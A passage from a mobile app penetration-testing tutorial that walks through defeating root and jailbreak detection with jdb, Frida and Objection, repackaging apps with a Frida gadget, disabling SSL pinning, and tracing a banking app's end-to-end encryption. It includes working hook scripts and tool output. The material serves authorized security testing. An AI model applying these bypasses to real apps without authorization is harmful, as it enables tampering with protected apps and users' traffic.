        &lt;1&gt; main[1]
        -------------------------------------------------

        While debugging the app, we could view local variables using &quot;locals&quot; command and also modify the variable on-the-fly. In this case, checkForBinary() method checked file existing then returned fileExists flag to &quot;true&quot;. We could bypass the file checking by changing fileExists flag value to &quot;false&quot; then resume the app process.

        -------------------------------------------------
        &lt;1&gt; main[1] set fileExists=false
         fileExists=false = false
        &lt;1&gt; main[1] locals
        Method arguments:
        f = instance of java.io.File(id=831931279824)
        Local variables:
        filename = &quot;su&quot;
        pathsArray = instance of java.lang.String[11] (id=831930532976)
        result = false
        path = &quot;/system/xbin/&quot;
        completePath = &quot;/system/xbin/su&quot;
        fileExists = false
        &lt;1&gt; main[1] resume
        -------------------------------------------------

        The root detection was bypassed which led us to conduct further attack. As you can see, there are more than 9 methods for checking root status on isRoot(). Therefore, the more checking, the more debugging times. Next chapter, we will introduce a Dynamic Binary Instrumentation method using Frida which allow us to easily bypass app logic including root detection.

        Please be noted that debugging and dynamic binary instrumentation will not permanently affect to app due to manipulating at runtime which is different from patching binary that will modify app permanently.


    +++++++++++++++++++++++++++
     [0x01c] - Hook on the fly
    +++++++++++++++++++++++++++

        Frida, which is a dynamic binary instrumentation toolkit which can inspect, analyze the behavior of a binary application at runtime through the injection of instrumentation code, supports multiplatforms including Windows, Linux, Mac, iOS, Android, QNX.

        Frida also has tracing feature that can be used to identify which method will be used while the app is running instead of guessing on class/method name from static analysis part. Also, we may use frida-tracing to identify used class/method then conduct static analysis to patch the application permanently. This chapter will be divided into 2 platforms which are iOS and Android.

        +++++++++++
        + Android +
        +++++++++++

            There is an awesome frida script (https://github.com/0xdea/frida-scripts/blob/master/raptor_frida_android_trace.js) written by Marco Ivaldi which can use to trace arbitrary Java Methods and Module functions by just specifying application package name or regular expression through the script !!

            In this case, the app package (com.example.vulnapp) and suspicious library package (com.johny.rootwine) were specified in frida tracing script &quot;raptor_frida_android_trace.js&quot; as shown below:

            ----------raptor_frida_android_trace.js----------
            ...
            // usage examples
            setTimeout(function() { // avoid java.lang.ClassNotFoundException

                Java.perform(function() {
                    trace(&quot;com.example.vulnapp&quot;);
                    trace(&quot;com.johny.rootwine&quot;);
                });
            }, 0);
            -------------------------------------------------

            Due to the root detection mechanism, the root detection library would be loaded immediately once the app had been opened; therefore, &quot;-f&quot; flag was used to spawn new process for tracing the app at initial process as shown below:

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ frida -U -f com.example.vulnapp -l raptor_frida_android_trace.js --no-pause
                 ____
                / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
               | (_| |
                &gt; _  |   Commands:
               /_/ |_|       help      -&gt; Displays the help system
               . . . .       object?   -&gt; Display information about &#039;object&#039;
               . . . .       exit/quit -&gt; Exit
               . . . .
               . . . .   More info at http://www.frida.re/docs/home/
            Spawned `com.example.vulnapp`. Resuming main thread!
            [Android Emulator 5554::com.example.vulnapp]-&gt; Tracing com.example.vulnapp.LibraryProvider.onCreate [1 overload(s)]
            Tracing com.example.vulnapp.MainActivity.onCreate [1 overload(s)]
            Tracing com.example.vulnapp.MainActivity.init [1 overload(s)]
            ...
            Tracing com.johny.rootwine.RootWine.isRooted [1 overload(s)]
            Tracing com.johny.rootwine.RootWine.detectRootManagementApps [2 overload(s)]
            ...
            *** entered com.example.vulnapp.MainActivity.checkRoot
            *** entered com.johny.rootwine.RootWine.isRooted
            *** entered com.johny.rootwine.RootWine.detectRootManagementApps
            *** entered com.johny.rootwine.RootWine.detectRootManagementApps
            arg[0]: null
            *** entered com.johny.rootwine.RootWine.checkForBinary
            arg[0]: su
            retval: true
            *** exiting com.johny.rootwine.RootWine.checkForBinary
            retval: true
            ...
            -------------------------------------------------

            The frida tracing script identified every loaded classes/methods including arguments and return value within specified application packages aligning with app activities. As the result, we could confirm that &quot;com.johny.rootwine&quot; package was used to detect root status on application; therefore, we could conduct static analysis further on this package.

            Let&#039;s analyze the RootWine.class on &quot;com.johny.rootwine&quot; package, isRooted() method will be used to detect root status as shown on code snippet below:

            -----------------RootWine.class------------------
            ...
            public boolean isRooted()
              {
                if ((detectRootManagementApps()) || (detectPotentiallyDangerousApps()) || (checkForBinary(&quot;su&quot;)) ||    (checkForBinary(&quot;busybox&quot;)) || (checkForDangerousProps()) || (checkForRWPaths()) || (detectTestKeys()) || (checkSuExists()) || (checkForRootNative())) {}
                for (boolean bool = true;; bool = false) {
                  return bool;
                }
              }
            ...
            -------------------------------------------------

            From code analysis, all checking on isRooted() method will return as boolean value (True/False). Hence, we could create Frida script using python binding to override isRooted() method to return &quot;false&quot; value as shown below:

            -----------------Frida_RootWine.py---------------
            #!/usr/bin/python
            import frida, sys
            def on_message(message, data):
                if message[&#039;type&#039;] == &#039;send&#039;:
                    print(&quot;[*] {0}&quot;.format(message[&#039;payload&#039;]))
                else:
                    print(message)
            jscode = &quot;&quot;&quot;
            Java.perform(function () {
                var MainActivity = Java.use(&#039;com.johny.rootwine.RootWine&#039;);
                MainActivity.isRooted.implementation = function () {
                    send(&#039;Method hooked...Modifying return value&#039;);
                    return false;
                };
            });
            &quot;&quot;&quot;
            process = frida.get_usb_device().attach(&#039;com.example.vulnapp&#039;)
            script = process.create_script(jscode)
            script.on(&#039;message&#039;, on_message)
            script.load()
            print &quot;[*] Bypassing RootWine Detection&quot;
            sys.stdin.read()
            -------------------------------------------------

            After that we could connect our laptop and device through USB debugging mode for frida script execution. Once the isRooted() method had been called, the frida would intercept and override the method by modifying the return value to be &quot;false&quot;
            
                                                 /---------------\
                                                 | Frida Hooking |
                   /-----------------------------|    isRooted() |
                   | (3)                         |  return false |
                   |                             \---------------/
                   |                                       ^
                   |                                       |
                   |                                    (2)|
                   V                                       |
            /-----------------------\          /--------------------\
            |  com.example.vulnapp  | (1)      | com.johny.rootwine |
            |   MainActivity.class  | --------&gt;|   RootWine.class   |
            |         checkRoot()   |          |   isRooted()       |
            \-----------------------/          \--------------------/
            
            Then, frida script(Frida_RootWine.py) had been executed to handle incoming hooked method then the root detection would be bypassed as shown below:

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ python Frida_RootWine.py
            [*] Bypassing RootWine Detection
            [*] Method hooked...Modifying return value
            -------------------------------------------------

            Frida also has community called &quot;Frida CodeShare&quot; (https://codeshare.frida.re) which is comprised of developers from around the world to contribute their frida scripts (e.g. Bypass Root detection, Bypass SSL pinning). There is an awesome project &quot;fridantiroot&quot; (https://codeshare.frida.re/@dzonerzy/fridantiroot/) on Android platform which can detect various root checking such as root packages, binary, property and so on in order to bypass root detection. The codeshare project can be used through &quot;--codeshare&quot; flag and &quot;-f&quot; flag would also be used to spawn new process for tracing the app at initial process as shown below:

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ frida --codeshare dzonerzy/fridantiroot -U -f com.example.vulnapp
                 ____
                / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
               | (_| |
                &gt; _  |   Commands:
               /_/ |_|       help      -&gt; Displays the help system
               . . . .       object?   -&gt; Display information about &#039;object&#039;
               . . . .       exit/quit -&gt; Exit
               . . . .
               . . . .   More info at http://www.frida.re/docs/home/
            Attaching...
            Hello! This is the first time you&#039;re running this particular snippet, or the snippet&#039;s source code has changed.

            Project Name: fridantiroot
            Author: @dzonerzy
            Slug: dzonerzy/fridantiroot
            Fingerprint: b5c9e7754d9432d6bb96fdec7aa53e458c6c4ee522209c4f2f8ecbe2b2a60955
            URL: https://codeshare.frida.re/@dzonerzy/fridantiroot

            Are you sure you&#039;d like to trust this project? [y/N] y
            Adding fingerprint b5c9e7754d9432d6bb96fdec7aa53e458c6c4ee522209c4f2f8ecbe2b2a60955 to the trust store! You won&#039;t be prompted again unless the code changes.
            Spawned `com.example.vulnapp`. Use %resume to let the main thread start executing!
            [Android Emulator 5554::com.example.vulnapp]-&gt; %resume
            [Android Emulator 5554::com.example.vulnapp]-&gt; message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Loaded 3824 classes!&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;loaded: -1&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;ProcessManager hook not loaded&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;KeyInfo hook not loaded&#039;} data: None
            [Android Emulator 5554::com.example.vulnapp]-&gt; message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Bypass root check for package: com.noshufou.android.su&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Bypass root check for package: com.noshufou.android.su.elite&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Bypass root check for package: eu.chainfire.supersu&#039;} data: None
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Bypass root check for package: com.koushikdutta.superuser&#039;} data: None
            ...
            message: {u&#039;type&#039;: u&#039;send&#039;, u&#039;payload&#039;: u&#039;Bypass native fopen&#039;} data: None
            -------------------------------------------------

        +++++++++++
        +   iOS   +
        +++++++++++

            In order to properly create Frida script, we need to identify loaded classes and methods. Hence, we could use Frida tracing feature (frida-trace) to identify the loaded classes/methods by specifying &quot;-m&quot; flag to trace specified Objective-C classes/methods. In this case, we specified &quot;JailSpot&quot; classname and also used &quot;*&quot; on any method type/method name, &quot;-f&quot; flag was also used to spawn new process for tracing the app at initial process as shown below:

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ frida-trace -m &quot;*[JailSpot *]&quot; -U -f com.example.vulnapp
            Instrumenting functions...
            -[JailSpot isJailbroken]: Auto-generated handler at &quot;/home/zeq3ul/Desktop/__handlers__/__JailSpot_isJailbroken_.js&quot;
            -[JailSpot didReceiveMemoryWarning]: Auto-generated handler at &quot;/home/zeq3ul/Desktop/__handlers__/__JailSpot_didReceiv_0298561d.js&quot;
            -[JailSpot initWithNibName:bundle:]: Auto-generated handler at &quot;/home/zeq3ul/Desktop/__handlers__/__JailSpot_initWithN_-433f25e.js&quot;
            -[JailSpot viewDidLoad]: Auto-generated handler at &quot;/home/zeq3ul/Desktop/__handlers__/__JailSpot_viewDidLoad_.js&quot;
            Started tracing 4 functions. Press Ctrl+C to stop.
                       /* TID 0x907 */
              2550 ms  -[JailSpot isJailbroken]
            -------------------------------------------------

            As the result, we would know that jailbreak detection only use isJailbroken method to check whether the app is running on jail-broken device or not. The classdump result, which already mentioned on Chapter [0x01a], would be used to determine type of method.

            -----------------classdump.txt-------------------
            ...
            @interface JailSpot : UIViewController
            {
            }
            - (_Bool)isJailbroken;
            - (void)didReceiveMemoryWarning;
            - (void)viewDidLoad;
            - (id)initWithNibName:(id)arg1 bundle:(id)arg2;
            @end
            ...
            -------------------------------------------------

            The isJailbroken method type was boolean which will return &quot;true&quot; when the app running on jail-broken device, &quot;false&quot; on non-rooted device. We now have all the information to create Frida script (js) in order to manipulate jailbreak detection logic on the app at the runtime.

            ---------------Bypass_Jailspot.js----------------
            if (ObjC.available) {
                try {
                    var className = &quot;JailSpot&quot;;
                    var funcName = &quot;- isJailbroken&quot;;
                    var hook = eval(&#039;ObjC.classes.&#039; + className + &#039;[&quot;&#039; + funcName + &#039;&quot;]&#039;);
                    Interceptor.attach(hook.implementation, {
                        onLeave: function(retval) {
                        console.log(&quot;[*] Method hooked...Modifying return value&quot;);
                        newretval = ptr(&quot;0x0&quot;)
                        retval.replace(newretval) } }); }
                catch(err) { console.log(&quot;[!] Exception: &quot; + err.message); } }
                else { console.log(&quot;Objective-C Runtime is not available!&quot;); }
            -------------------------------------------------

            Once the isJailbroken method had been called, the frida would intercept and override the method by modifying the return value to be &quot;false&quot;. Then, frida script(Bypass_Jailspot.js) had been executed to handle incoming hooked method then the jailbreak detection would be bypassed.

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ frida -U -f com.example.vulnapp -l Bypass_Jailspot.js
                 ____
                / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
               | (_| |
                &gt; _  |   Commands:
               /_/ |_|       help      -&gt; Displays the help system
               . . . .       object?   -&gt; Display information about &#039;object&#039;
               . . . .       exit/quit -&gt; Exit
               . . . .
               . . . .   More info at http://www.frida.re/docs/home/

            [iOS Device::Vulnapp]-&gt; [*] Method hooked...Modifying return value
            -------------------------------------------------

    ++++++++++++++++++++++++++++
     [0x01d] - No root can gain
    ++++++++++++++++++++++++++++

        Basically, Rooted/jail-broken device is needed to do DBI due to frida architecture. What if we could use frida on non-rooted/non-jailbroken device ? Yes, we can and that mean we will not care about root/jailbreak detection anymore because we can conduct Dynamic/Runtime analysis without rooting/jailbreaking. W00T W00T !!

        This can be done through patching application by inserting frida library into the binary then re-packaging the app. We can do it automatically using &quot;Objection&quot; (https://github.com/sensepost/objection) which is a runtime mobile exploration toolkit, powered by Frida and support both iOS and Android platforms. Objection also have many features to access filesystem, class/method, keychain, dump memory, built-in scripts without the need for a jailbroken or rooted mobile device.

        +++++++++++
        + Android +
        +++++++++++

            The application package (APK) must be patched and code signed to load the `frida-gadget.so` on start. This can be done automatically using a &quot;patchapk&quot; subcommand that will determine the target architecture of your device using `adb`, extract the source APK, insert the INTERNET permission if it does not already exist, patch and embed the `frida-gadget.so` and repackage and sign a new APK for you.

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ objection patchapk --source vulnapp.apk
            No architecture specified. Determining it using `adb`...
            Detected the architecture as: armeabi-v7a
            Using Gadget version: 10.3.14
            Unpacking vulnapp.apk
            App already has android.permission.INTERNET
            Reading smali from: /tmp/tmpbwqu1jyf.apktemp/smali/com/example/vulnapp/MainActivity.smali
            Injecting loadLibrary call at line: 18
            Writing patched smali back to: /tmp/tmpbwqu1jyf.apktemp/smali/com/example/vulnapp/MainActivity.smali
            Creating library path: /tmp/tmpbwqu1jyf.apktemp/lib/armeabi-v7a
            Copying Frida gadget to libs path...
            Rebuilding the APK with the frida-gadget loaded...
            Built new APK with injected loadLibrary and frida-gadget
            Signing new APK.
            Signed the new APK
            Copying final apk from /tmp/tmpbwqu1jyf.apktemp.objection.apk to current directory...
            Cleaning up temp files...
            -------------------------------------------------

            Once an Android APK has been patched to embed the Frida gadget, application can be started and then the app will be in a paused state until we connect objection using &quot;objection -g explore&quot; command.

            -------------------------------------------------
            zeq3ul@home:~/Desktop$ objection -g explore
                 _     _         _   _
             ___| |_  |_|___ ___| |_|_|___ ___
            | . | . | | | -_|  _|  _| | . |   |
            |___|___|_| |___|___|_| |_|___|_|_|
                    |___|(object)inject(ion) v1.2.2

                 Runtime Mobile Exploration
                    by: @leonjza from @sensepost

            [tab] for command suggestions
            com.example.vulnapp on (samsung: 7.0) [usb] # ls
            Type       Last Modified            Read    Write    Hidden    Size     Name
            ---------  -----------------------  ------  -------  --------  -------  ------------
            Directory  2017-12-06 11:07:04 GMT  True    False    False     4.0 KiB  lib
            Directory  2017-12-04 23:34:15 GMT  True    True     False     4.0 KiB  cache
            Directory  2017-12-06 12:13:43 GMT  True    True     False     4.0 KiB  shared_prefs
            Directory  2017-12-06 12:12:52 GMT  True    True     False     4.0 KiB  files
            Directory  2017-12-06 12:13:36 GMT  True    True     False     4.0 KiB  databases

            Readable: Yes  Writable: Yes
            -------------------------------------------------

            From the example result, we could access the application folder through Objection non-rooted device. Any frida commands or custom scripts are also available by just using frida command connect to the device instead of using Objection.

        +++++++++++
        +   iOS   +
        +++++++++++

            The application package (IPA) must be patched and code signed to load the &quot;FridaGadget.dylib&quot; on start. To patch an IPA though, a few things need to be done in preparation, such as getting an &quot;embedded.mobileprovision&quot; file, as well as a code signing certificate from Apple. Once you have these, objection has a &quot;patchipa&quot; subcommand that will help you take care of the rest (https://github.com/sensepost/objection/wiki/Patching-iOS-Applications).

            -------------------------------------------------
            zeq3ul-MacBook:Desktop zeq3ul$ objection patchipa --source &quot;vulnapp.ipa&quot; --codesign-signature 0B197F2xxx
            Using Gadget version: 10.5.15
            No provision file specified, searching for one...
            Found provision file /Users/zeq3ul/Library/Developer/Xcode/DerivedData/vulnapp-dhjuudmztjpbrdgvszdkdtbawert/Build/Products/Debug-iphoneos/vulnapp.app/embedded.mobileprovision expiring in 6 days, 16:55:00.630254
            Found a valid provisioning profile
            Working with app: Vulnapp.app
            Bundle identifier is: com.example.vulnapp
            Creating Frameworks directory for FridaGadget...
            Codesigning 1 .dylib&#039;s with signature 0B197F2xxx
            Code signing: FridaGadget.dylib
            Creating new archive with patched contents...
            Codesigning patched IPA...
            Cannot find entitlements in binary. Using defaults

            Copying final ipa from /var/folders/q8/vdq51bkj251_yhm86gmbmtgc0000gn/T/vulnapp-frida-codesigned.ipa to current directory...
            Cleaning up temp files...
            -------------------------------------------------

            Once you have a patched IPA ready,the ios-deploy can be used to install and run the patched application on non-jailbroken devices using &quot;ios-deploy --bundle Payload/vulnapp.app -d&quot; then the app can be started in a paused state until we connect objection using &quot;objection -g explore&quot; command (https://github.com/sensepost/objection/wiki/Running-Patched-iOS-Applications). There is a trick to specify &quot;-m&quot; flag to ios-deploy after first installation in case we don&#039;t want to re-install the app. This can help us to conduct dynamic analysis on insecure data storage when the app is unintentionally closed.

            -------------------------------------------------
            zeq3ul-MacBook:Desktop zeq3ul$ ios-deploy --bundle Payload/Vulnapp.app/ -m
            [....] Waiting for iOS device to be connected
            [....] Using 144040c0c6870c6775bac6c3ca56361ca0f08343 (N94AP, iPhone 4S, iphoneos, armv7) a.k.a. &#039;iPhone&#039;.
            ------ Debug phase ------
            Starting debug of 144040c0c6870c6775bac6c3ca56361ca0f08343 (N94AP, iPhone 4S, iphoneos, armv7) a.k.a. &#039;iPhone&#039; connected through USB...
            [  0%] Looking up developer disk image
            [ 95%] Developer disk image mounted successfully
            [100%] Connecting to remote debug server
            -------------------------
            …
            (lldb)     connect
            (lldb)     run
            success
            2017-12-07 23:37:11.856 Vulnapp[240:8908] Frida: Listening on 127.0.0.1 TCP port 27042
            (lldb)
            -------------------------------------------------

            We can now open another terminal for connecting the application through Objection as shown below:

            -------------------------------------------------
            zeq3ul-MacBook:Desktop zeq3ul$ objection -g explore
                 _     _         _   _
             ___| |_  |_|___ ___| |_|_|___ ___
            | . | . | | | -_|  _|  _| | . |   |
            |___|___|_| |___|___|_| |_|___|_|_|
                    |___|(object)inject(ion) v1.2.2

                 Runtime Mobile Exploration
                    by: @leonjza from @sensepost

            [tab] for command suggestions
            com.example.vulnapp on (iPhone: 9.3.5) [usb] #
            -------------------------------------------------

			
########################
 [0x02] - Roof &amp; Tunnel
########################

    Another well-known security protections on mobile app are &quot;SSL Pinning&quot; and &quot;End-to-end encryption&quot;. SSL Pinning protection can prevent man-in-the-middle attack and malicious doers to intercept the traffic between application and backend API. End-to-end encryption is an extra protection for preventing MiTM when the SSL pinning protection is defeated because the request/response traffic will be encrypted. This chapter will show you how to bypass SSL pinning and beat the end-to-end encryption to conduct security testing on backend API.

    +++++++++++++++++++++++++++++++
     [0x02a] - You shall(not) pass
    +++++++++++++++++++++++++++++++

        In order to conduct security testing in term of authentication and authorization, session management, business logic and input validation on backend API, we need to bypass this protection for intercepting/modifying the traffic both request and response using any proxies. There are many automated tools (e.g. SSLUnpinning, SSL-TrustKiller, SSL-Kill-Switch2) can bypass SSL pinning (Rooted/Jail-broken device is required).
        Q: What if dev know these tools and implement the detection ?
        A: We may use the techniques that mentioned earlier (Patching or Runtime manipulation), but it would be better to use Objection or automated frida scripts to defeat this protection.

        The Objection also has built-in frida scripts to bypass SSL pinning on both iOS and Android platforms. In this case, SSL pinning on iOS platforms was defeated using &quot;ios sslpinning disable&quot; command on Objection as shown below:

        -------------------------------------------------
        zeq3ul-MacBook:Desktop zeq3ul$ objection -g explore
             _     _         _   _
         ___| |_  |_|___ ___| |_|_|___ ___
        | . | . | | | -_|  _|  _| | . |   |
        |___|___|_| |___|___|_| |_|___|_|_|
                |___|(object)inject(ion) v1.2.2

            Runtime Mobile Exploration
            by: @leonjza from @sensepost

        [tab] for command suggestions
        com.example.vulnapp on (iPhone: 9.3.5) [usb] # ios sslpinning disable
        Job: 71b65089-6f5c-4488-9291-4e0b01245042 - Starting
        [4e0b01245042] [ios-ssl-pinning-bypass] [NSURLSession] Found 4 matches for URLSession:didReceiveChallenge:completionHandler:
        [4e0b01245042] [ios-ssl-pinning-bypass] [NSURLConnection] Found 3 matches for connection:willSendRequestForAuthenticationChallenge:
        [4e0b01245042] [ios-ssl-pinning-bypass] Hooking lower level methods: SSLSetSessionOption, SSLCreateContext, SSLHandshake and tls_helper_create_peer_trust
        Job: 71b65089-6f5c-4488-9291-4e0b01245042 - Started
        com.example.vulnapp on (iPhone: 9.3.5) [usb] # [4e0b01245042] [ios-ssl-pinning-bypass] [tls_helper_create_peer_trust] Called
        [4e0b01245042] [ios-ssl-pinning-bypass] [tls_helper_create_peer_trust] Called
        -------------------------------------------------

        SSL pinning on Android platforms was also defeated using &quot;android sslpinning disable&quot; command on Objection as shown below:

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ objection -g explore
             _     _         _   _
         ___| |_  |_|___ ___| |_|_|___ ___
        | . | . | | | -_|  _|  _| | . |   |
        |___|___|_| |___|___|_| |_|___|_|_|
                |___|(object)inject(ion) v1.2.2

            Runtime Mobile Exploration
            by: @leonjza from @sensepost

        [tab] for command suggestions
        com.example.vulnapp on (samsung: 7.0) [usb] # android sslpinning disable
        Job: 349ae70f-61e3-4c0d-9e78-d04d78c477d0 - Starting
        [d04d78c477d0] [android-ssl-pinning-bypass] Custom, Empty TrustManager ready
        [d04d78c477d0] [android-ssl-pinning-bypass] OkHTTP 3.x Found
        Job: 349ae70f-61e3-4c0d-9e78-d04d78c477d0 - Started
        com.example.vulnapp on (samsung: 7.0) [usb] # [d04d78c477d0] [android-ssl-pinning-bypass] Overriding SSLContext.init() with the custom TrustManager
        [d04d78c477d0] [android-ssl-pinning-bypass] OkHTTP 3.x check() called. Not throwing an exception.
        [d04d78c477d0] [android-ssl-pinning-bypass] Overriding SSLContext.init() with the custom TrustManager
        -------------------------------------------------

        In case of bypassing SSL pinning on built-in objection doesn&#039;t work, we may use another automated script from Frida codeshare (https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/). The script can manipulate the SSLContext by re-pinning the application to our own CA as shown below:

        -------------------------------------------------
        zeq3ul@home:~/Desktop$ frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -U com.example.vulnapp
             ____
            / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
           | (_| |
            &gt; _  |   Commands:
           /_/ |_|       help      -&gt; Displays the help system
           . . . .       object?   -&gt; Display information about &#039;object&#039;
           . . . .       exit/quit -&gt; Exit
           . . . .
           . . . .   More info at http://www.frida.re/docs/home/
        Attaching...
        Hello! This is the first time you&#039;re running this particular snippet, or the snippet&#039;s source code has changed.

        Project Name: Universal Android SSL Pinning Bypass with Frida
        Author: @pcipolloni
        Slug: pcipolloni/universal-android-ssl-pinning-bypass-with-frida
        Fingerprint: 0a7771bd4f6cba7d0e230552fede02b4d1585fd9f19cc1f21a51aa2a1f417e98
        URL: https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida

        Are you sure you&#039;d like to trust this project? [y/N] y
        Adding fingerprint 0a7771bd4f6cba7d0e230552fede02b4d1585fd9f19cc1f21a51aa2a1f417e98 to the trust store! You won&#039;t be prompted again unless the code changes.
        [Android Emulator 5554::com.example.vulnapp]-&gt;
        [.] Cert Pinning Bypass/Re-Pinning
        [+] Loading our CA...
        [o] Our CA Info: CN=PortSwigger CA, OU=PortSwigger CA, O=PortSwigger, L=PortSwigger, ST=PortSwigger, C=PortSwigger
        [+] Creating a KeyStore for our CA...
        [+] Creating a TrustManager that trusts the CA in our KeyStore...
        [+] Our TrustManager is ready...
        [+] Hijacking SSLContext methods now...
        [-] Waiting for the app to invoke SSLContext.init()...
        [o] App invoked javax.net.ssl.SSLContext.init...
        [+] SSLContext initialized with our custom TrustManager!
        [o] App invoked javax.net.ssl.SSLContext.init...
        [+] SSLContext initialized with our custom TrustManager!
        ...
        -------------------------------------------------

        The HTTPs request and response traffic will be shown in Burp Suite proxy !!

    ++++++++++++++++++++++++++++++
     [0x02b] - You shall(not) see
    ++++++++++++++++++++++++++++++

        Recently, many application start to implement another level of control to defeat traffic tampering and man-in-the-middle threat, an end-to-end encryption on application layer (mostly HTTP). This make our job harder because even we have managed to bypass jailbreak detection + ssl pinning and try to setup the man-in-the-middle proxy to intercept the traffic we still cannot see the actual parameter from a request and response between device and the server as the application layer data itself also encrypted.

        So we need to find the way to working on it, one way of doing so is to reverse engineer the application and try to find their methods of encoding/encrypting the data then try to decode/decrypt them to get the plaintext. But this might take some (or long) time to figure out the whole process especially when dealing with obfuscated code. Another way is to ask for client to remove the encryption for us which sometime this is not possible for whatever reasons.

        That&#039;s when we can (again) utilizing run time manipulation with dynamic instrumentation tools such as frida to circumvent such controls. As we know that the methods of a specific class can be traced using Macro&#039;s frida script, we can try to trace for a method use to perform the encryption. The idea was to manipulate the plaintext before they turn into cipher and send out to the server. Because we think that the parameter values definitely have to be constructed in a form of plaintext before encrypted and sending out to server.

        The function we gonna demonstrate here is the function of a mobile banking application that shows account summary of current login user. Also, the UI did not allowed user to change an account number or any information.

        First we tried to intercept the traffic using Burp Suite proxy as normal. But the body of traffic we intercepted from the was a URL+base64 encoded string which does not seems to be able to decoded to readable text.

        -----------HTTP REQUEST------------
        POST /api/v1/account/summary HTTP/1.1
        ...
        iWuuTQmWa6uXJns3zO6BNNPfdfHjSj9nRPs%2FjQhxf%2FieJqsh%2BO%2FvEU5YxeA9GJKbNL%2F0sLK8Novj%0A7%2BNuMPH2kBZ5cleljzsaffGq%2FiZDORYTV9csiY%2BmG%2FjvYI6WqpPn%0A
        ----------------------------------- 

        The server also responded with the similar thing and the strings also change every time we issue a new request so we think the application has implement some kind of encryption.

        -----------HTTP RESPONSE-----------
        HTTP/1.1 200 OK
        ...
        a+AkYTvbAwOK7ueCcY6TxtIxMqba0pSBpBjR+bP7pu7jXfrAOgYXHklq0CMou05WJRl3WPn/DMb/throQEmdrD6YcPNMHFo+y4/tIccPHUf/eepPTJQqVKBr0WohD5Ev3kPiuo9G6NjuS3343bzXL/5GAD7X3qYQfoKfTSd1FH87Q1Jm4V3hegesy7tVcK1GhOrbIgRtdNiYvSRxLgEs5VY0yISqnROe4GHSIXlT9tf1XsA0bqdjNI1kJwgk3IVAkQdIHCUlwfXUrSV6EJ8SBw==
        ----------------------------------- 

        Next what we did was to find the class responsible for encrypting the message. This could be done by using frida tracing through &quot;raptor_frida_android_trace.js&quot; in order to identify classes/methods which were used for encrypting the message while the app performing the function.
		
        -------------------------------------------------
        frida -U com.example.vulnapp -l raptor_frida_android_trace.js --no-pause
             ____
           / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
           | (_| |
            &gt; _  |   Commands:
           /_/ |_|       help      -&gt; Displays the help system
           . . . .       object?   -&gt; Display information about &#039;object&#039;
           . . . .       exit/quit -&gt; Exit
           . . . .
           . . . .   More info at http://www.frida.re/docs/home/

        [Android Emulator 5554::com.example.vulnapp]-&gt; Tracing com.example.vulnapp.Extend_Main$1.onClick [1 overload(s)]
        Tracing com.example.vulnapp.E2e.access$200 [1 overload(s)]
        Tracing com.example.vulnapp.E2e.alertText [1 overload(s)]
        Tracing com.example.vulnapp.E2e.createHmac [1 overload(s)]
        Tracing com.example.vulnapp.E2e.encrypt [1 overload(s)]
        Tracing com.example.vulnapp.E2e.generateAESKey [1 overload(s)]
        Tracing com.example.vulnapp.E2e.isNetworkAvailable [1 overload(s)]
        Tracing com.example.vulnapp.E2e.afterRetreiverKeyExchange [1 overload(s)]
        Tracing com.example.vulnapp.E2e.decrypt [1 overload(s)]
        Tracing com.example.vulnapp.E2e.hmacSha256 [1 overload(s)]
        Tracing com.example.vulnapp.E2e.init [1 overload(s)]
        Tracing com.example.vulnapp.E2e.onClick [1 overload(s)]
        Tracing com.example.vulnapp.E2e.onCreate [1 overload(s)]
        ...
        *** entered com.example.vulnapp.E2e.encrypt
        arg[0]: [object Object]
        arg[1]: [object Object]
        retval: x+wc8M4vAXDQSA7eAT0/l4a5I1v6rxDB0j4TmLQqaqKjbli2KJ5u+GD7rs/ThQylb5Ym/zDaW3bk6ztA3lsp2jwC3zWuJs/vZwLSPdFwQCPne2IKSBHN21d547HylkZi
        *** exiting com.example.vulnapp.E2e.encrypt
        -------------------------------------------------
		
        Initially, Frida tracer hooked whole classes/methods under application packages name (com.example.vulnapp) and we found the classes responsible for encrypting a message so we scoped down to the method to looking for an actual plain request.
		
        As the tracing result, encryption method took 2 objects as arguments. Note that return value (retval) of encryption method was the cipher similar to what we found from interception proxy. Hence, the next step was to find out what those arguments were. Modifying was needed on &quot;raptor_frida_android_trace.js&quot; by converting the arguments object into string through &quot;JSON.stringify()&quot; for printing out object&#039;s value as shown below:
    
        ----------raptor_frida_android_trace.js----------
        ...
        // print args
        if (arguments.length) console.log()
            for (var j = 0; j &lt; arguments.length; j++) {
                try {
                    console.log(&#039;arg[&#039; + j + &#039;]: &#039; + JSON.stringify(arguments[j]))
                } catch (e) {
                    console.log(&#039;arg[&#039; + j + &#039;]: &#039; + arguments[j])
                }
            }
        ...
        --------------------------------------------------
		
        Once the frida tracer script was modified, new result of tracing was shown below:
		
        --------------------------------------------------
        *** entered com.example.vulnapp.E2e.encrypt
        arg[0]: [93,6,87,92,64,-63,-92,17,5,84,-80,32,125,-39,98,9,-74,113,40,87,67,-24,-11,-56,81,-45,2,-50,-102,-105,-20,-59]
